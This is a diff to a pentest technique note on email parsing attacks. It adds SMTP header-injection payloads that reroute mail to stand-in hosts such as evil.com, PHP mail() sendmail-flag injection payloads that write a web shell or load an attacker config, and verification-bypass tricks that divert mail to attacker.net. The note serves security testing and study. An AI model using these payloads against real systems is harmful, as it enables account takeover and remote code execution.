@@ -4,8 +4,8 @@ type: technique
 tags: [account-takeover, auth-bypass, ssrf, xss, open-registration, web, portswigger]
 phase: exploitation
 date_created: 2026-06-18
-date_updated: 2026-06-18
-sources: [kettle-splitting-the-email-atom]
+date_updated: 2026-07-15
+sources: [kettle-splitting-the-email-atom, hacktricks-web]
 ---
 
 # Email Address Parsing Attacks
@@ -87,6 +87,28 @@ Joomla (CVE-2024-21725), GitHub (May 2024), GitLab Enterprise + web (Apr 2024), 
 - Normalise/decode all encodings **before** extracting the domain; parse once and validate against that single representation.
 - Reject non-ASCII in the domain (or apply strict IDNA); use only RFC-compliant, audited parsing libraries and confirm the validator and the MTA agree.
 
+## SMTP header injection and PHP mail() RCE
+
+When user input is placed into an outbound email without CRLF filtering, inject `%0A`/`%0D` to add SMTP headers and reroute or rewrite mail (add recipients, forge subject, overwrite the body). Classic sinks: contact forms, invite flows, password-reset senders.
+
+```
+From:sender@domain.com%0ACc:attacker@evil.com%0ABcc:attacker2@evil.com
+From:sender@domain.com%0ATo:attacker@evil.com
+From:sender@domain.com%0ASubject:Fake%20Subject
+From:sender@domain.com%0A%0AInjected%20body%20replaces%20original
+```
+
+PHP `mail($to,$subj,$msg,$headers,$params)` abuse: if the 5th argument (`$additional_parameters`) is attacker-influenced, it is appended to the sendmail command line. It passes through `escapeshellcmd` (which does NOT stop argument injection), so you can inject sendmail flags to write files or reach RCE depending on the MTA (Sendmail/Postfix/Exim differ):
+
+```
+# argument-injection style payloads into $additional_parameters
+-OQueueDirectory=/tmp -X/var/www/html/shell.php     # write a log-poisoned PHP file
+-C/tmp/evil.cf                                        # load an attacker config (Sendmail)
+```
+
+Email-name whitelist/verification bypass for privileged-domain signups: mail servers ignore `+tag`, `-tag`, `{}`, and `(comment)` in the local part (`john.doe+x@ex.com` -> `john.doe@ex.com`), accept IP-literal domains (`user@[127.0.0.1]`, `user@[IPv6:2001:db8::1]`), and PHP `chr()` 256-overflow lets `String.fromCodePoint(0x10000+0x40)` collapse to `@`, enabling `RCPT TO:<"collab@attacker.net>collab"@target.com>` so the verification mail diverts to an attacker inbox while the account claims the victim domain.
+
 ## Sources
 
 - Gareth Heyes, PortSwigger Research, "Splitting the email atom: exploiting parsers to bypass access controls" (2024) (slug: kettle-splitting-the-email-atom) (`https://portswigger.net/research/splitting-the-email-atom`).
+- HackTricks (pentesting-web) - SMTP header injection, PHP mail() RCE (slug: hacktricks-web).
